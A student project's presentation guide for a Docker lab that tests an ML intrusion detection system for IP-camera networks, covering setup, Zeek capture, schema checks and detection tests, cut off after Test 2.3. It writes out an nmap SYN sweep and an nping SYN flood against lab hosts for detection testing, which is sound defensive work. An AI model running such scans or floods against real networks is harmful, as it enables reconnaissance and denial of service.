# Progress Meeting Presentation Guide & Requirements Verification Manual

**Project:** Real-Time Intrusion Detection and Autonomous Response System for IP-Camera IoT Networks Using Machine Learning  
**Group:** Group 03 — University of Sri Jayewardenepura  
**Reference Document:** [`docs/requirements_checklist.md`](docs/requirements_checklist.md)  
**Supporting Architecture:** [`A_TO_Z_SYSTEM_FLOW.md`](A_TO_Z_SYSTEM_FLOW.md)  
**Date:** 13 November 2026 (every command below was run on the virtual lab on this day, in Windows PowerShell 5.1)

---

> 🌐 **Language:** English | [**සිංහල මාර්ගෝපදේශය (Sinhala Version) මෙතැනින් බලන්න**](PROGRESS_MEETING_PRESENTATION_GUIDE_SI.md)

> 🎯 **Purpose of this Guide:**  
> During the Progress Meeting with the supervisors (Dr. A.A.M. Matheeh & Dr. Senaka Amarakeerthi), this guide gives the exact terminal commands, the real outputs, and short presentation scripts for every Functional Requirement (FR-01 to FR-08), every Proposal Table 9 target, the Research Objectives (O1 to O6), and the Research Questions (RQ1 to RQ5 & Hypothesis H1), **in the order of [`docs/requirements_checklist.md`](docs/requirements_checklist.md)**.
>
> It shows two things clearly and separately:
> - **what is built and works on real packets in the virtual lab**, and
> - **what still needs the hardware lab with a real camera** (Steps 20, 35–39).
>
> ⚠️ **Presentation Principle:**  
> No black-box wrapper scripts for the attacks: we use standard tools (`curl`, `nmap`, `nping`, `nc`). For every proof:
> 1. **💡 Why We Are Doing This (Requirement & Objective)**
> 2. **⚙️ What Happens Under the Hood When Run**
> 3. **💻 Direct Raw Command (Terminal)**
> 4. **🔍 Line-by-Line Code Breakdown**
> 5. **📋 Real Output (13 Nov 2026)**
> 6. **📊 Output Breakdown**
> 7. **🔬 What It Proves (and what it does not prove)**
> 8. **🗣️ Spoken English Script for the Supervisor**

> 🧾 **Numbers that change on every run:** latency, confidence, flow counts, timer values and timestamps change from run to run. The outputs below are real outputs from 13 Nov 2026. Read the numbers from the screen during the meeting; do not read them from this guide.

---

# Table of Contents

1. [Status at a Glance (read this first)](#0-status-at-a-glance-read-this-first)
2. [Pre-Meeting Lab Initialization (Cold Start)](#1-pre-meeting-lab-initialization-cold-start)
3. [Part 1: Functional Requirements Verification (FR-01 to FR-08)](#2-part-1-functional-requirements-verification-fr-01-to-fr-08)
   - [FR-01: Live Packet Capture & Flow Extraction](#fr-01-live-packet-capture--flow-extraction-must--schema-test)
   - [FR-02: Multi-Class ML Inference & Live Attack Detection](#fr-02-multi-class-ml-inference--live-attack-detection-must--live-attack-suite)
   - [FR-03: Database Storage](#fr-03-database-storage-for-benign-attacks--mitigations-must--db-test)
   - [FR-04: Authenticated Dashboard & WebSocket Push](#fr-04-authenticated-dashboard--real-time-websocket-push-must--socketio-test)
   - [FR-05: Controlled Nmap Asset Discovery](#fr-05-controlled-nmap-asset-discovery-should--inventory-test)
   - [FR-06: Router Firewall Rules, Expiry & Timers](#fr-06-router-firewall-rules-expiry--timers-must--firewall-test)
   - [FR-07: Allowlists, Thresholds & Audit Trail](#fr-07-allowlists-thresholds--audit-trail-must--safety-test)
   - [FR-08: Filtered Log Export](#fr-08-filtered-forensic-log-export-should--export-test)
4. [Part 2: Proposal Table 9 Targets](#3-part-2-proposal-table-9-targets)
5. [Part 3: Research Objectives (O1 to O6)](#4-part-3-research-objectives-o1-to-o6)
6. [Part 4: Hypothesis H1 and Research Questions RQ1 to RQ5](#5-part-4-hypothesis-h1-and-research-questions-rq1-to-rq5)
7. [Part 5: Automated Test Suite (314 Tests)](#6-part-5-automated-test-suite-314-tests)
8. [Part 6: Live Manual Attack Playbook](#7-part-6-live-manual-attack-playbook)
9. [Part 7: Questions the Supervisor May Ask](#8-part-7-questions-the-supervisor-may-ask)

---

# 0. Status at a Glance (read this first)

| Item | State on 13 Nov 2026 | Evidence |
| :--- | :--- | :--- |
| FR-01 to FR-08 | **Built and shown on real packets in the virtual lab.** FR-05 uses the real Nmap binary on the lab network. | Part 1 of this guide; `reports/fr_tests/` |
| Table 9 — Classification | **Met on the classes present:** macro-F1 0.8595 on held-out 34-1. **But 34-1 is not a clean test** (it was opened and studied before). 5-class macro-F1 0.6876. | `reports/experiments/model_card.md` |
| Table 9 — Benign safety | **Partly.** Camera, NVR and admin PC were never blocked; NVR recording kept going. **FPR on real camera traffic is not measured yet** (needs the hardware lab, Step 20). | Target 2 |
| Table 9 — Latency | **Met in the virtual lab** for "Zeek line → dashboard" (median 0.141 s, 95% 0.636 s, Step 37 report). The wait for Zeek to finish a long flow is extra and is reported. | `reports/performance/virtual/` |
| Table 9 — Throughput | **Enough for the virtual lab** (model about 14,000–23,000 flows/s in a batch; lab peak 500 flows/s). Zeek capture loss **0.0%** since the snap-length fix (D-058). | Target 4 |
| Table 9 — Reliability | **Backend restart recovery shown.** Full Step 38 tests (router reboot, power loss) not done. | Target 5 |
| Table 9 — Usability / audit | **Manual block, unblock and audit shown.** The formal admin task test (Step 39) not done. | Target 6 |
| H1 | **Not confirmed yet.** Part 1 met on the classes-present number (with the 34-1 warning); Part 2 (FPR ≤ 5% on our camera) not tested. | Part 4 |

---

# 1. Pre-Meeting Lab Initialization (Cold Start)

Ten minutes before sharing your screen, run the steps below in PowerShell in the project folder (`D:\intrusion detection`).

> [!IMPORTANT]
> **Prerequisite:** Docker Desktop is running, and MongoDB is running on `localhost:27017`.

---

#### 1. Start All 11 Docker Containers:

> 1. **💡 Why:** To start the virtual lab of Proposal Section 5.1 (Step 5): camera, NVR, admin PC, router, Zeek sensor, attacker, cloud server and the IDS scanner.

> 2. **⚙️ Under the hood:** Docker reads `lab_virtual/docker-compose.yml`, makes 3 networks (camera LAN `192.168.50.0/24` on bridge `br-ids-lan`, outside network `10.10.10.0/24` on bridge `br-ids-out`, and a small `mgmt` network that only carries the SSH port from Windows to the router), and starts 11 containers.

```powershell
# Option 1: the project's lab controller (recommended)
.venv\Scripts\python.exe lab_virtual\lab.py up

# Option 2: Docker Compose directly
docker compose -f lab_virtual\docker-compose.yml up -d

# Check: list the running containers
docker ps --format "table {{.Names}}\t{{.Status}}"
```

> 5. **📋 Real Output (`docker ps`, 13 Nov 2026):**
```text
NAMES                   STATUS
ids-lab-nvr             Up 3 hours
ids-lab-admin           Up 3 hours
ids-lab-sensor          Up 3 hours
ids-lab-camera          Up 3 hours
ids-lab-cloud           Up 3 hours
ids-lab-attack-server   Up 3 hours
ids-lab-scanner         Up 3 hours
ids-lab-router          Up 3 hours
ids-lab-camera-net      Up 3 hours
ids-lab-attacker        Up 3 hours
ids-lab-cloud-net       Up 3 hours
```

> 6. **📊 Output Breakdown:**
- `ids-lab-router` (192.168.50.1 / 10.10.10.1): Linux router with the project's `nftables` table; SSH on `127.0.0.1:2222`.
- `ids-lab-sensor`: Zeek, listening on bridge `br-ids-lan` (it has no IP address on the camera LAN).
- `ids-lab-camera` (192.168.50.30): camera simulator — web page on port 80, video stream on port 554, cloud status every 30 s.
- `ids-lab-nvr` (192.168.50.20): records the camera stream in 5-minute segments.
- `ids-lab-admin` (192.168.50.10): opens the camera web page every 60 s.
- `ids-lab-scanner` (192.168.50.5): runs the IDS's approved Nmap scans (FR-05).
- `ids-lab-attacker` (10.10.10.50): has `nmap`, `nping` and `nc`.
- `ids-lab-attack-server`: shares the attacker's address; web server with the harmless test program `/bins/lab_test.x86`.
- `ids-lab-cloud` (10.10.10.123): the camera's normal cloud server (TCP 443, UDP 123, UDP 53).
- `ids-lab-camera-net`, `ids-lab-cloud-net`: small helper containers that hold the network settings for the camera and the cloud.
- The network names in Docker are `ids-lab_camlan`, `ids-lab_outside` and `ids-lab_mgmt`.

> [!NOTE]
> **After a change to `sensor/local.zeek`** (for example the snap-length fix of 13 Nov 2026, D-058), restart only the sensor: `docker restart ids-lab-sensor`. Zeek then starts a new `conn.log`; the backend notices this by itself ("Log truncation detected" in `lab_virtual\ids_backend.log`) and keeps reading. Never empty `conn.log` by hand while Zeek runs.

---

#### 2. Start the IDS Backend & Dashboard on Port 5000:

> 1. **💡 Why:** Starts the live pipeline (reads Zeek's `conn.log` and `files.log`), loads the Random Forest bundle, connects to the router over SSH, and serves the dashboard on port 5000.

> 2. **⚙️ Under the hood:** `lab.py ids-start` sets `IDS_SETTINGS_FILE=lab_virtual/settings.lab.yaml`, `DB_NAME=iot_ids_lab` and `PORT=5000`, starts `python -m core_engine.app` in the background, saves the PID in `lab_virtual/ids_backend.pid`, waits for `/api/health`, and starts the pipeline. At start-up the backend compares the database blocklist with the router (startup recovery).

```powershell
.venv\Scripts\python.exe lab_virtual\lab.py ids-start
```

> [!NOTE]
> In Windows PowerShell 5.1, `Start-Process` has no `-Environment` option. Use `lab.py ids-start`. Start the backend **only once** (stop it first with `lab.py ids-stop` if it is already running).

> 5. **📋 Real Output:**
```text
IDS backend running (pid 25256), database iot_ids_lab; pipeline start: 200 running
Dashboard: http://localhost:5000 (served by the backend)  login in D:\intrusion detection\lab_virtual\keys\dashboard_login.txt
```

---

#### 3. Clean the Lab Before the Demo (very important):

> 1. **💡 Why:** Old blocks or old test servers change the results:
> - A block left from an earlier test drops the attacker's packets at the router, so a new attack is not seen.
> - A C&C test server left running on port 6667 (`lab_server.py --role cnc`) makes the camera's C&C tries **succeed**. Short successful connections raised **no alert** in our test on 13 Nov. A leftover server also stops `nc -lp 6667` from opening the port.

```powershell
# 1. Stop any C&C test server left from an earlier run (it is fine if this prints nothing):
docker exec ids-lab-attack-server pkill -f "lab_server.py --role cnc"

# 2. Remove all blocks and rate-limits (database and router together):
.venv\Scripts\python.exe lab_virtual\lab.py reset
```

> 5. **📋 Real Output:**
```text
removed 0 block(s) through the IDS
router sets now: {'block_src': [], 'block_dst': [], 'limit_src': []}
```

> Run `lab.py reset` again **between the attack tests** in FR-02.

---

#### 3b. Fresh Backend Start After Any Rehearsal (very important for FR-02):

> 1. **💡 Why:** The model's window features remember what each source did in the **last 60 minutes** (for example `pair_fail_1h` = failed tries from the same source to the same address). Every rehearsal from the attacker `10.10.10.50` adds to this memory. After several floods and scans in the same hour, a new scan can look like C&C. On 13 Nov 2026 the same subnet sweep gave **CnC 0.52 and a block** after about an hour of repeated tests, and **PortScan 0.84** right after a backend restart. `lab.py reset` clears the firewall, **not** this memory.

> 2. **⚙️ Under the hood:** the window memory (`WindowState`) and the policy's repeat counter live only in the backend's memory, so a restart starts them empty (issue 41). The database and the router are not changed by the restart; startup recovery keeps them in step.

```powershell
.venv\Scripts\python.exe lab_virtual\lab.py ids-stop
.venv\Scripts\python.exe lab_virtual\lab.py ids-start
```

> 5. **📋 Real Output:**
```text
IDS backend stopped
IDS backend running (pid 20864), database iot_ids_lab; pipeline start: 200 running
```

> **Rules for the demo:**
> - Do this after the last rehearsal, just before the meeting.
> - Run the FR-02 tests **once each, in the order 2.1 → 2.2 → 2.3 → 2.4 → 2.5**, with `lab.py reset` between them. (The scan before the flood: thousands of flood flows from the attacker would change how the next scan looks.)
> - To repeat an attack, do the fresh backend start again first.

---

#### 4. Check the Router Firewall (`nftables`):

> 1. **💡 Why:** To show the router's kernel firewall table before any attack.

> 2. **⚙️ Under the hood:** `docker exec` runs `nft list table inet ids` inside the router container. The table comes from `sensor/ids_router.nft`, loaded when the router starts.

```powershell
docker exec ids-lab-router nft list table inet ids
```

> 5. **📋 Real Output:**
```text
table inet ids {
	set allow {
		type ipv4_addr
		elements = { 192.168.50.1, 192.168.50.5,
			     192.168.50.10, 192.168.50.20 }
	}

	set block_src {
		type ipv4_addr
		flags timeout
	}

	set block_dst {
		type ipv4_addr
		flags timeout
	}

	set limit_src {
		type ipv4_addr
		flags timeout
	}

	chain forward {
		type filter hook forward priority filter; policy accept;
		ip saddr @allow accept
		ip saddr @block_src drop
		ip daddr @block_dst drop
		ip saddr @limit_src limit rate over 200/second burst 5 packets drop
	}
}
```

> 6. **📊 Output Breakdown:**
- **`set allow`** — the 4 management addresses that are never blocked (`settings.lab.yaml` → `allowlist`):
  - `192.168.50.1` — router / gateway.
  - `192.168.50.5` — IDS sensor management port (here: the scanner container that runs the approved Nmap scans).
  - `192.168.50.10` — admin workstation.
  - `192.168.50.20` — NVR.
- **The camera `192.168.50.30` is NOT on the allowlist.** It is protected from **automatic** blocks by a different rule: `lab.local_networks` (the whole camera LAN). For a C&C case, the policy blocks the outside address, never the camera.
- **`block_src` / `block_dst`** — drop sets with a timer (`flags timeout`); empty now.
- **`limit_src`** — rate-limit set for an outside DDoS source (decision D-055); packets over 200 per second are dropped.
- **`chain forward`** — the order matters: allowlist first, then the drop sets, then the rate-limit.

---

#### 5. Open the Dashboard and the 7 Pages:

Open **`http://localhost:5000`** in Chrome or Edge:
- **Username:** `labadmin`
- **Password:** the second word in `lab_virtual/keys/dashboard_login.txt` (do not show this file on screen).

| Page | Address | What to show (real labels) |
| :--- | :--- | :--- |
| 🖥️ Overview | `/overview` | **SYSTEM STATUS (MEASURED)** card: pipeline status, model version **v3.1.0**, **MONITORED FLOWS**, "Time per flow, Zeek line to dashboard (median / 95%)"; **ATTACK CLASS DISTRIBUTION** chart |
| 🚨 Live Alerts | `/alerts` | New alert cards arrive without refresh; badge **MODEL PREDICTION**; class, confidence, response status; **CONFIRM INCIDENT** button |
| 📜 Attack History | `/history` | Saved events from MongoDB, with class filter |
| 📷 Devices & Scans | `/devices` | **TRIGGER NMAP** button; IP, MAC / vendor, open ports, camera heuristic, **MARK CAMERA** |
| 🛡️ Blocklist | `/mitigations` | Active blocks and rate-limits, **EXPIRES AT** time, **UNBLOCK** button, **ENFORCE BLOCK** form |
| ⚙️ Settings | `/settings` | Minimum-confidence slider (30%), repeats (3 in 60 s), rule time (30 min), allowlist; automatic response shown as **ON/OFF (read only — set in the YAML settings file)**; **SAVE OPERATIONAL SETTINGS** |
| 📥 Logs & Export | `/export` | Type, class and date filters; **EXPORT RFC 4180 CSV** and **EXPORT STRUCTURED JSON** buttons; audit log table |

The top bar shows a green dot and **SOCKET.IO LIVE** when the live connection is open.

---

### 💡 Key Concept to Clarify Upfront: Why We Built This Virtual Testbed

If the supervisor asks: **"Is this purely simulated?"**

#### 1. Reason (Proposal Section 5.1, decision D-053):
* The evaluation needs a separated network where attacks can be run safely and repeated (Proposal 5.1 allows "an IP camera or a camera simulator").
* The virtual lab lets us run the whole real system before the hardware lab is ready.

#### 2. What is real and what is simulated:
* **Real:**
  - **Network packets** on Linux bridges (`br-ids-lan`, `br-ids-out`).
  - **Zeek** capturing those packets and writing `conn.log`, `files.log`, `http.log`.
  - **The Random Forest model v3.1.0** (trained on IoT-23) making live predictions.
  - **Linux `nftables`** in the router container, changed over SSH.
  - **The React dashboard** with Socket.IO on port 5000, and **MongoDB**.
  - **Nmap / nping / netcat / curl** binaries.
* **Simulated:**
  - **The camera** (`192.168.50.30`): a Python program with a web page (port 80) and a video-like stream (port 554, about 200 KB/s). It is not a real camera.
  - **The NVR, admin PC, cloud server and attacker** are small containers.
  - **No IoT-23 benign device is an IP camera** (proposal 2.3), and the camera here is a simulator. So the benign false-positive rate on **real camera traffic** must still be measured in the hardware lab (Step 20).

#### 3. Opening Statement:
> *"Good morning Sir. Before the demonstration I would like to explain our test setup. As planned in proposal Section 5.1, we built the complete system in a Docker virtual lab. The packets, the Zeek sensor, the Random Forest model v3.1.0, the nftables router firewall, MongoDB and the dashboard are real. The camera, NVR, admin PC and attacker are simulated containers, so we can run attacks safely. The real-camera tests, including the benign false-positive rate, will be done in the hardware lab as planned."*

---

# 2. Part 1: Functional Requirements Verification (FR-01 to FR-08)

---

### FR-01: Live Packet Capture & Flow Extraction (Must / Schema Test)

> **Proposal Requirement:** "Capture mirrored or inline traffic, and make connection flows from it."  
> **Method:** Show that Zeek listens on the camera LAN bridge, that one live request immediately becomes a Zeek flow record, and that live flows have the same 27 feature columns as the training data.

> 💡 **What is Promiscuous Mode?**
> - **Normal mode:** a network card keeps only frames sent to its own MAC address.
> - **Promiscuous mode:** the card keeps every frame it sees.
> - **Why it matters here:** the camera–NVR video and the attacker's packets are not sent to the sensor. Zeek has no IP on the camera LAN; it only listens on the bridge (like a switch mirror port in the real lab) and copies the packets.

---

#### Step 1: Show Zeek is Listening on the Camera LAN Bridge:

```powershell
docker logs ids-lab-sensor --tail 2
```
- `docker logs ids-lab-sensor`: the start-up messages of the Zeek container.
- `--tail 2`: only the last 2 lines.

> 📋 **Real Output:**
```text
listening on br-ids-lan
```
- Zeek is capturing on bridge `br-ids-lan` (the camera LAN).

---

#### Step 2: Send One Live Request and Show the Zeek Record:

> ⚙️ **Under the hood:** The admin PC (`192.168.50.10`) opens the camera web page with `curl`. Zeek follows the TCP connection, and when it ends, writes one line to `conn.log`. We wait 8 seconds so Zeek has written the line.

```powershell
docker exec ids-lab-admin curl -s -o /dev/null -w "HTTP %{http_code}, %{size_download} bytes" http://192.168.50.30/
Start-Sleep 8
Get-Content lab_virtual\zeek_logs\conn.log | Select-String '"id.orig_h":"192.168.50.10","id.orig_p":[0-9]*,"id.resp_h":"192.168.50.30","id.resp_p":80' | Select-Object -Last 1
```

##### 🔍 Line-by-Line Breakdown:
- `docker exec ids-lab-admin curl -s ... http://192.168.50.30/`: the admin PC downloads the camera page (`-s` = quiet; `-o /dev/null` = do not print the page, inside the Linux container; `-w` = print the status and size).
- `Start-Sleep 8`: wait until Zeek writes the finished connection.
- `Select-String '..."id.orig_h":"192.168.50.10"...80'`: keep only admin PC → camera port 80 lines (this hides the camera's cloud traffic and the NVR stream). The pattern is in **single quotes** because it contains double quotes.
- `Select-Object -Last 1`: the newest such line.

##### 📋 Real Output (13 Nov 2026):
```text
HTTP 200, 5478 bytes
```
```json
{"ts":1794555951.137147,"uid":"CJ97dO10ieapu8Fta3","id.orig_h":"192.168.50.10","id.orig_p":44800,"id.resp_h":"192.168.50.30","id.resp_p":80,"proto":"tcp","service":"http","duration":0.0009369850158691406,"orig_bytes":77,"resp_bytes":5618,"conn_state":"SF","local_orig":true,"local_resp":true,"missed_bytes":0,"history":"ShADadfF","orig_pkts":6,"orig_ip_bytes":397,"resp_pkts":6,"resp_ip_bytes":5938,"ip_proto":6}
```

##### 📊 Output Breakdown:
- `ts`: the time of the connection (UNIX seconds).
- `uid`: Zeek's ID for this connection (the same ID links `conn.log`, `http.log` and `files.log`).
- `id.orig_h` / `id.orig_p`: the admin PC and its temporary port.
- `id.resp_h` / `id.resp_p`: the camera and port 80.
- `proto: tcp`, `service: http`: Zeek recognised HTTP from the content.
- `duration: 0.0009`: the whole request took about 0.9 ms.
- `orig_bytes: 77`: the size of the HTTP GET request; `resp_bytes: 5618`: the camera page (5,478 bytes, as `curl` printed) plus the HTTP headers.
- `conn_state: SF`: normal start (SYN) and normal end (FIN).
- `orig_pkts: 6`, `resp_pkts: 6`: packets seen in each direction.
- `missed_bytes: 0`: no data missing in this connection.
- `history: ShADadfF` — Zeek's record of the TCP steps (capital = from the admin PC, small = from the camera):

| Letter | Meaning in this connection |
| :---: | :--- |
| `S` | Admin PC sends SYN (start) |
| `h` | Camera answers SYN-ACK |
| `A` | Admin PC sends ACK (connection open) |
| `D` | Admin PC sends data (the HTTP GET) |
| `a` | Camera sends a pure ACK |
| `d` | Camera sends data (the web page) |
| `f` | Camera sends FIN (closes its side) |
| `F` | Admin PC sends FIN (closes its side) |

> **Note:** use `curl` here. Python's `urllib` sometimes closes with a reset (we saw `RSTO`, `ShADadfR`, 6 + 5 packets on 13 Nov), so its record is less tidy.

##### 🔬 What It Proves:
One real request becomes one Zeek flow record with full TCP state, seconds after it ends. This is the input of the whole pipeline.

---

#### Step 3: Schema Check — Live Zeek Flows vs. IoT-23 Training Data (Step 22, RQ3):

> 💡 **Why:** The model was trained on IoT-23. The live pipeline must give the model the **same 27 columns**, with the same types, no missing values and no impossible values. The tool also reports **how different** the live traffic is.

> ⚙️ **Under the hood:** `tools/schema_check.py` makes the 27 features from the live `conn.log` with the same code used in training (`ml_engine/features.py`, `ml_engine/window_features.py`), compares them with the training features (1,384,070 rows), runs the model on them, and writes `reports/schema_check.md`.

```powershell
.venv\Scripts\python.exe tools\schema_check.py --live-path lab_virtual\zeek_logs\conn.log --source real
```
- `--live-path ...conn.log`: the live Zeek file.
- `--source real`: the report labels the data as a real capture (not synthetic).

##### 📋 Real Output (last lines, 13 Nov 2026):
```text
Offline sample size: 1384070 rows | Live sample size: 10674 rows
Schema Audit Results: Columns=True | Dtypes=True | Nulls=True | Ranges=True | Inference=True => OVERALL=PASS
Format check passed (see the report for distribution and category differences).
```

##### 📊 Output Breakdown:
- `Columns=True`: the same 27 columns in the same order.
- `Dtypes=True`: the same data types.
- `Nulls=True`: no missing values.
- `Ranges=True`: no negative counts, ratios between 0 and 1.
- `Inference=True`: the model gives valid probabilities on the live features.
- `Live sample size`: the number of flows in the current `conn.log`. It grows with time since the sensor started (2,617 flows about 10 minutes after a sensor restart; 10,674 earlier the same day). The result was PASS both times.
- **In the report (`reports/schema_check.md`):** 14 of 27 features have a large distribution shift (KS ≥ 0.3), for example `duration`, `orig_pkts`, `pair_gap`; and 2 features (`service`, `history`) have values never seen in training.

##### 🔬 What It Proves (and does not prove):
- **Proves:** the live pipeline makes exactly the input the model expects (format PASS).
- **Does not prove:** that live traffic looks like IoT-23. It does not; the shift is a domain difference and is the answer we report for RQ3. The final RQ3 answer uses real camera traffic (Step 22 in the hardware lab).

> ⚠️ This command rewrites `reports/schema_check.md` and `reports/schema_check.csv`. That is expected.

#### 🖥️ Dashboard:
Open **`/overview`** → **SYSTEM STATUS (MEASURED)**: the pipeline is running and **MONITORED FLOWS** grows every few seconds.

#### 🗣️ Spoken Script:
> *"Sir, for FR-01, Zeek listens on the camera LAN bridge without an IP address. When the admin PC opens the camera page with curl, Zeek writes one connection record with the full TCP history 'ShADadfF', 6 packets each way. Our schema check on more than ten thousand live flows passes the format test: the same 27 columns, types and ranges as the IoT-23 training data. The same report also shows that 14 features are distributed differently from IoT-23. We report this as a domain difference for RQ3, and we will repeat it on the real camera."*

---

### FR-02: Multi-Class ML Inference & Live Attack Detection (Must / Live Attack Suite)

> **Proposal Requirement:** "Put each usable flow into a class; give back the class, the confidence and the model version."  
> **Method:** We run 5 tests with standard tools (`curl`, `nmap`, `nping`, `nc`) and show, for each one: the command output, the Zeek record, the alert (class, confidence, model version) and the router's response.

#### 💡 How the response decision works (say this before the tests):
1. **Alert:** every attack class raises an alert at confidence ≥ 0.30.
2. **Automatic action** needs **all** of these (`core_engine/response_policy.py`):
   - automatic response switched ON (it is ON in the virtual lab only);
   - confidence ≥ the class threshold: **CnC 0.30 → block, PortScan 0.88 → block, DDoS_DoS 0.30 → rate-limit (D-055), Malware_Download → alert only**;
   - the target is not on the allowlist and is not a camera-LAN device;
   - **3 alerts of the same class for the same target within 60 s**;
   - a rule time of at most 30 minutes.
3. A program download is found by a **file-type rule** on Zeek's `files.log` (`core_engine/file_check.py`), not by the model. IoT-23 has only about 84 real download flows, too few to learn from (model card, section 6).

#### ⚙️ Command to read the alerts (use after each test, or show the Live Alerts page):
The **Live Alerts** page (`/alerts`) shows each alert as it arrives. In the terminal, the newest events can be read with:
```powershell
.venv\Scripts\python.exe -c "
import urllib.request, json
with open('lab_virtual/keys/dashboard_login.txt') as f:
    u, p = f.read().strip().split()[:2]
req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
tok = json.loads(urllib.request.urlopen(req).read())['token']
ev = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/events?limit=5', headers={'Authorization':'Bearer '+tok})).read())['events']
for e in ev:
    print(e['timestamp'][11:19], e['predicted_class'], round(e['confidence'], 2), e['src_ip'], '->', e['dst_ip'] + ':' + str(e['dst_port']), 'flows', e.get('flow_count'), '| response', e.get('response_status'), e.get('response_reason') or '', '| model', e['model_version'])
"
```
- The times are UTC.

> ⚠️ Run `.venv\Scripts\python.exe lab_virtual\lab.py reset` **between the tests**. A block from one test stops the next one.

---

#### [Test 2.1] Benign: Admin Opens the Camera Web Page (`curl`)

💡 **Objective:** Normal admin access is classed Benign and gives no alert and no block.

⚙️ **Under the hood:** The admin PC (`192.168.50.10`, on the allowlist) downloads the camera page. Zeek records a normal `SF` connection; the model predicts Benign; the flow is counted in the benign traffic summary only.

💻 **Command:**
```powershell
docker exec ids-lab-admin curl -s http://192.168.50.30/ | Select-String "Lab IP camera"
```
- `curl -s http://192.168.50.30/`: download the camera page quietly.
- `Select-String "Lab IP camera"`: show only the lines with the camera's name.

📋 **Real Output:**
```text
    <title>Lab IP Camera - Live Web Interface</title>
            <h1>Lab IP camera</h1>
```

🕵️ **Zeek record:** the same kind of line as FR-01 Step 2: `"conn_state":"SF"`, `"history":"ShADadfF"`, `"resp_bytes":5618`.

🖥️ **Dashboard & firewall:**
- **Live Alerts:** no new card.
- **Overview:** **MONITORED FLOWS** grows.
- **Router:** `block_src`, `block_dst`, `limit_src` stay empty.
- Background evidence (entry 3.78): about 6 hours of normal traffic (12 Nov 18:05 to 13 Nov 00:09 UTC) gave no alert for the camera, NVR or admin PC.

---

#### [Test 2.2] PortScan: Attacker Sweeps the Camera Subnet (`nmap`)

💡 **Objective:** An outside scan of the camera LAN raises **PortScan** alerts.

⚙️ **Under the hood:** `nmap -sS` sends TCP SYN probes to ports 23, 80 and 554 on all 256 addresses of `192.168.50.0/24`. Closed ports answer with a reset (`REJ`), and silent addresses give `S0`. The window features (`src_conn_60s`, `src_udst_60s`, `src_uport_60s`) grow fast because one source touches many addresses and ports in a few seconds.

💻 **Command:**
```powershell
docker exec ids-lab-attacker nmap -sS -p 23,80,554 192.168.50.0/24 | Select-String "Nmap done|Nmap scan report"
```
- `-sS`: TCP SYN scan (half-open; the handshake is never finished).
- `-p 23,80,554`: Telnet, HTTP, RTSP — the usual camera ports.
- `192.168.50.0/24`: the whole camera LAN.
- `Select-String`: show only the found hosts and the summary.

📋 **Real Output (13 Nov 2026):**
```text
Nmap scan report for 192.168.50.1
Nmap scan report for 192.168.50.5
Nmap scan report for 192.168.50.10
Nmap scan report for 192.168.50.20
Nmap scan report for 192.168.50.30
Nmap scan report for 192.168.50.254
Nmap done: 256 IP addresses (6 hosts up) scanned in 4.31 seconds
```

🚨 **Alerts (real, 13 Nov 2026):**
```text
07:47:55 PortScan 0.49 10.10.10.50 -> 192.168.50.5:80    | response none
07:47:55 PortScan 0.51 10.10.10.50 -> 192.168.50.10:80   | response none
07:47:55 PortScan 0.86 10.10.10.50 -> 192.168.50.254:80  flows 3 | response none
```
- Evidence note on the card: `Unanswered TCP probe sweep: conn_state=S0, resp_pkts=0, ... (Confidence: 85.7%)`, reason `SCAN_RAPID_PROBE_SWEEP`.

🛡️ **Router:** `block_src` stays empty. PortScan blocking needs confidence ≥ 0.88 **and** 3 alerts in 60 s; the highest in this run was 0.86. The confidence changes from run to run: on 13 Nov the same sweep gave 0.86, **0.88** (response `candidate`, reason `SKIP_NOT_REPEATED` — 1 of the 3 alerts needed) and 0.64. So the PortScan alert always appears, but a block does not.

> ⚠️ **Do not use a scan of one host for this demo.** `nmap -sS -p 23,80,554 192.168.50.30` (one host, 3 ports) gave **one CnC alert (0.48), not PortScan**, on 13 Nov. Too few flows for the window features (see Part 7, issues 43 and 46).

> ⚠️ **Run this test soon after a fresh backend start (Section 1, step 3b).** After about an hour of repeated floods and scans from `10.10.10.50`, the same sweep gave **CnC 0.52** and the attacker was blocked (`AUTO_CNC_DEST_BLOCK`). Right after a restart it gave PortScan 0.84 again.

---

#### [Test 2.3] DDoS: TCP SYN Flood on Camera Port 80 (`nping`)

💡 **Objective:** A high-rate SYN flood from outside raises **DDoS_DoS** alerts, and the router **rate-limits** the source (D-055).

⚙️ **Under the hood:** `nping` builds raw TCP SYN packets: 1,000 per second, 5,000 in total, from `10.10.10.50` to `192.168.50.30:80`. Zeek writes thousands of short half-open flows. The model predicts DDoS_DoS; after 3 alerts in 60 s, the policy adds the attacker to `limit_src` (packets over 200/s are dropped).

💻 **Command:**
```powershell
docker exec ids-lab-attacker nping --tcp -p 80 --flags syn --rate 1000 -c 5000 192.168.50.30 | Select-String "Starting|Raw packets|Nping done"
```
- `--tcp -p 80`: TCP to port 80 (camera web page).
- `--flags syn`: only the SYN flag (half-open connections).
- `--rate 1000`: 1,000 packets per second.
- `-c 5000`: 5,000 packets in total.

📋 **Real Output (13 Nov 2026, 09:06 UTC):**
```text
Raw packets sent: 5000 (270.000KB) | Rcvd: 2512 (110.528KB) | Lost: 2488 (49.76%)
```
- `Lost` means nping got no answer for these packets. Most of this is **our router rate-limiting the attacker after the IDS acted** (see below), not the camera breaking.

🚨 **Alert (real, 13 Nov 2026, 09:07 UTC):**
```text
09:07:01 DDoS_DoS 0.42 10.10.10.50 -> 192.168.50.30:80  flows 1583 | response rate_limited AUTO_DDOS_RATELIMIT
```
- The DDoS_DoS confidence is low (0.38–0.45 in our runs), but it is the top class of the five and is above the DDoS rate-limit threshold **0.30**.
- All flood flows of one burst are joined into **one** event (here 1,583 flows), so the dashboard is not flooded with cards.

🛡️ **Router:**
```powershell
docker exec ids-lab-router nft list set inet ids limit_src
docker exec ids-lab-router nft list set inet ids block_src
```
```text
limit_src:  elements = { 10.10.10.50 timeout 30m expires 29m34s816ms }
block_src:  (no elements line = empty)
```

📊 **What to say honestly:**
- The DDoS_DoS class was found and the source was **rate-limited** (not blocked) as planned in D-055. The response action `rate_limit AUTO_DDOS_RATELIMIT` is saved in MongoDB (fixed on 13 Nov 2026, D-058).
- In **one of three** runs on 13 Nov (07:48 UTC), the first flood flows were also predicted **CnC (0.63)**, so the attacker was **also fully blocked** in `block_src` under the C&C reason. This is our known **open issue 43** (repeated failed connections to one address can look like C&C). If it happens in the demo, say so.
- The camera itself was never blocked.

